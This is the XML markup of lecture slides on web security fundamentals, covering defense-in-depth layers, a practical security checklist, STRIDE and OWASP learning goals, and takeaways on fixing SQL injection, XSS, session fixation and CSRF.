          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7059"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E8EEF3"/>
          </a:solidFill>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="1F3B57"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1719072" y="1828800"/>
            <a:ext cx="8723376" cy="466344"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F3B57"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Network</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1719072" y="2256282"/>
            <a:ext cx="8723376" cy="310896"/>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TLS everywhere, firewall rules, rate limiting</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2148840" y="2715768"/>
            <a:ext cx="7863840" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7059"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E8EEF3"/>
          </a:solidFill>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="1F3B57"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2221992" y="2715768"/>
            <a:ext cx="7717536" cy="466344"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F3B57"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Application</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2221992" y="3143250"/>
            <a:ext cx="7717536" cy="310896"/>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Input validation, parameterized queries, output encoding</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2651760" y="3602736"/>
            <a:ext cx="6858000" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7059"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1F3B57"/>
          </a:solidFill>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="1F3B57"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2724912" y="3602736"/>
            <a:ext cx="6711696" cy="466344"/>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Authentication</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2724912" y="4030218"/>
            <a:ext cx="6711696" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D6E0EA"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Strong hashing (bcrypt/Argon2), MFA, session regeneration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3154680" y="4489704"/>
            <a:ext cx="5852160" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7059"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E8EEF3"/>
          </a:solidFill>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="1F3B57"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3227832" y="4489704"/>
            <a:ext cx="5705856" cy="466344"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F3B57"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Data</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3227832" y="4917186"/>
            <a:ext cx="5705856" cy="310896"/>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Encryption at rest, least-privilege DB accounts</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3657600" y="5376672"/>
            <a:ext cx="4846320" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7059"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E8EEF3"/>
          </a:solidFill>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="1F3B57"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3730752" y="5376672"/>
            <a:ext cx="4700016" cy="466344"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F3B57"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Monitoring</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3730752" y="5804154"/>
            <a:ext cx="4700016" cy="310896"/>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Logging, alerting, and regular patch management</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>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21" name="Text 19"/>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4.1 CHECKLIST</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A Practical Security Checklist</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8686800"/>
              </a:tblGrid>
              <a:tr h="566928">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Area</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Checklist Item</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Input handling</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Every database query uses parameterized statements — never string concatenation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Output handling</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Every value rendered into HTML is encoded for its context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Sessions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Session ID regenerated on login; cookies marked HttpOnly and Secure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Forms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State-changing requests (POST/PUT/DELETE) require a CSRF token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Dependencies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Third-party libraries are tracked and patched on a known schedule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Monitoring</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Failed logins and unusual access patterns are logged and alertable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bl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 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6" name="Text 3"/>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RECAP</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By the End of Today You Can…</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1463040"/>
            <a:ext cx="365760" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1F3B57"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1F3B57"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1463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6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1097280" y="141732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Threat-model a real system — </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B2B2B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Apply STRIDE to a login flow and identify concrete attack points.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2240280"/>
            <a:ext cx="365760" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1F3B57"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1F3B57"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="22402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9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1097280" y="219456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Navigate the OWASP Top 10 — </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B2B2B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Explain all ten risk categories in plain terms.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3017520"/>
            <a:ext cx="365760" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1F3B57"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1F3B57"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3017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12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1097280" y="297180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Fix an injection flaw — </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B2B2B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Rewrite a concatenated SQL query as a parameterized statement.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3794760"/>
            <a:ext cx="365760" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1F3B57"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1F3B57"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3794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4</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1097280" y="374904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Fix an XSS flaw — </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B2B2B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Explain why output encoding, not input sanitisation alone, stops XSS.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4572000"/>
            <a:ext cx="365760" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1F3B57"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1F3B57"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4572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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1097280" y="452628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Reason about layered defense — </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B2B2B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Map a real breach's root causes onto specific defense-in-depth layers.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>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20" name="Text 18"/>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SUMMARY</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Key Takeaways</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1463040"/>
            <a:ext cx="10424160" cy="4297680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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STRIDE gives a repeatable checklist (Spoofing, Tampering, Repudiation, Info disclosure, DoS, Elevation of privilege) for threat-modeling any system, starting from its structural model.</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The OWASP Top 10 is the industry-ranked baseline of Web risks, built from real incident data, not theory.</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SQL injection is fixed by parameterized queries, XSS by output encoding — 'sanitising input' alone is not a reliable fix for either.</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Session fixation and CSRF both exploit how cookies work automatically (Week 2) — regenerate session IDs at login, and require CSRF tokens on state-changing requests.</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Real breaches like Equifax usually come from ordinary, preventable failures (unpatched dependencies, missing monitoring) compounding — defense in depth means no single failure equals one breach.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5"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Security Fundamentals</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6"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2026-09-02T10:37:14Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-09-02T10:37:14Z</dcterms:modified>
</cp:coreProperties>
</file>